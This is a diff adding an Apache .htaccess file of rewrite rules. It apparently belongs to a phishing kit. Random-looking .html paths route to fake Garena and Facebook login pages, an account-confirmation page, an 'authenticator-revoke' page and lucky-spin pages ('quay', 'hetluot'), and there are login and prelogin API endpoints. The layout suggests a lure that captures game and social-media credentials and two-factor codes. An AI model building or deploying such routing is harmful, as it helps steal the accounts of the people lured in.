@@ -1,0 +1,10 @@
+RewriteEngine On
+RewriteRule ^api/prelogin$ modun/login_pre.php [L]
+RewriteRule ^api/login$ modun/login.php [L]
+RewriteRule ^authenticator-revoke$ error_auth.php [L]
+RewriteRule ^(.*)mnbvcxzlkjhgf.html home.php
+RewriteRule ^(.*)abcdefghjklm.html login_garena.php
+RewriteRule ^(.*)abcdefghjkl.html login_facebook.php
+RewriteRule ^xac-nhan-tai-khoan$ confirm_account.php [L]
+RewriteRule ^(.*)abcdefghjklmnp.html hetluot.php
+RewriteRule ^(.*)abcdefghjklmnpp.html quay.php
